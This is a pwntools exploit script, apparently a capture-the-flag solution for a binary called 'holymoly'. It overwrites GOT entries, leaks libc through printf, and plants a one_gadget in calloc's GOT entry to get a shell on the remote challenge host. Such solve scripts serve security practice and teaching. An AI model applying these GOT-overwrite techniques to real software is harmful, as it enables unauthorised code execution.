from pwn import *
elf =  ELF("./holymoly_patched")
libc = ELF("./libc.so.6")

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:22576'

ip, port = cyberedu.split(':')
port = int(port)


if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#gdb.attach(p, gdbscript = '''
#b * 0x40153d
#c
#''')

#holymoly = +0x1000
#rolypoly = +0x100
#monopoly = +0x10
#guacamole = +0x1

#robocarpoli = -0x1000
#halligally = -0x100
#brocolli = -0x10
#bordercollie = -0x1

#blueberry = write to stdout addr of ptr
#cranberry = *ptr = val

#turn ptr/val to specific value func
#ok buf <- 0x404010

#assuming the initial val is null
def changeval(val):
    payload = b''
    cat = val // 0x1000
    rest = val % 0x1000
    
    payload += b"holymoly" * cat 
    if (rest == 0):
        return payload
        
    cat2 = rest // 0x100
    rest2 = rest % 0x100
    
    payload += b"rolypoly" * cat2
    if(rest2==0):
        return payload
        
    cat3 = rest2 // 0x10
    rest3 = rest2 % 0x10
    
    payload += b"monopoly" * cat3
    if(rest3==0):
        return payload
        
    payload += b"guacamole" * rest3
    return payload
    
#changeval negative
def changeval_neg(val):
    payload = b''
    cat = val // 0x1000
    rest = val % 0x1000
    
    payload += b"robocarpoli" * cat 
    if (rest == 0):
        return payload
        
    cat2 = rest // 0x100
    rest2 = rest % 0x100
    
    payload += b"halligally" * cat2
    if(rest2==0):
        return payload
        
    cat3 = rest2 // 0x10
    rest3 = rest2 % 0x10
    
    payload += b"broccoli" * cat3
    if(rest3==0):
        return payload
        
    payload += b"bordercollie" * rest3
    return payload
    
def changeval_pro(ini, fin):
    #caca
    dif = fin - ini
    dif = int(dif)
    if dif == 0:
        return b''
    
    if(dif > 0):
        payload = changeval(dif)
        return payload
    if(dif < 0):
        dif = abs(dif)
        payload = changeval_neg(dif)
        return payload
    

#turn val to specific value func
#initially, crestem/coboram val si mystery schimba

main = 0x4011f6
puts_got = 0x404018

#overwrite puts to main at first so we can collect the libc leak
#val = main
#ptr = puts.got = 0x404018

#then leak libc
#0x4040B8 is val
#0x4040C0 is ptr 

#first, val <- main
puts_to_main = b""
puts_to_main += changeval(main)
#now we change ptr to be putsgot 
puts_to_main += b"mystery"
puts_to_main += changeval(puts_got)

#trigger the write val in ptr
puts_to_main += b"cranberry"

p.recvuntil(b"? ")
p.sendline(puts_to_main)
#it worked lets go, and val/ptr reset to 0

#now, print wahts inside 0x404028, aka printf got. we're writing in ptr now
leak_libc = b""
leak_libc += changeval(0x404028)
leak_libc += b"blueberry"

p.recvuntil(b"? ")
p.sendline(leak_libc)

data = p.recv(8)
val = u64(data.ljust(8, b"\x00"))
libc.address = val - 0x61c90

print(f"libc is at {hex(libc.address)}")

#finally cred ca m am prins
#overwrite la un got+4 -> doar partea de jos. desi,.... idfk
#pt one_gadfet 0x401110 ◂— endbr64 e r12.. non writeae
#calloc: rdx=0 r15=0 0xe3b01

one_gadget = libc.address + 0xe3b01
pompa = one_gadget
print(f"best one gadget is {hex(one_gadget)}")

#in calloc 
#sau daca scriem byte by byte lol? ok asa sa fie!

#scriem aici in ptr
calloc = 0x404038
caca = b""
caca += changeval(calloc)
old_byted = 0
pompa = int(pompa)

for i in range(0, 8):
    caca += b"mystery"
    byted = pompa % 0x100
    print(f"byte {i} is {hex(byted)}")
    pompa = pompa // 0x100
    caca += changeval_pro(old_byted, byted)
    caca += b"cranberry"
    #prepare for next iter
    old_byted = byted
    caca += b"mystery"
    caca += b"guacamole"
    

#[0x404038] calloc@GLIBC_2.2.5 -> 0x7f13d9819b01 (execvpe+641) ◂— mov rsi, r15
#why tf is setvbuf overwritten to 0x7f0000000000 XD
#ok ayae il reconstruim cumva, scanf daca se f nu e problema

setvbuf = libc.sym[b'setvbuf']
pompa = int(setvbuf)
#aceeasi chestie, doar ca pt setvbuf
for i in range(0, 8):
    caca += b"mystery"
    byted = pompa % 0x100
    print(f"byte {i} is {hex(byted)}")
    pompa = pompa // 0x100
    caca += changeval_pro(old_byted, byted)
    caca += b"cranberry"
    #prepare for next iter
    old_byted = byted
    caca += b"mystery"
    caca += b"guacamole"
    

#caca += b"blueberry"
p.recvuntil(b"? ")
p.sendline(caca)
#alelluuia o mers 

p.interactive()
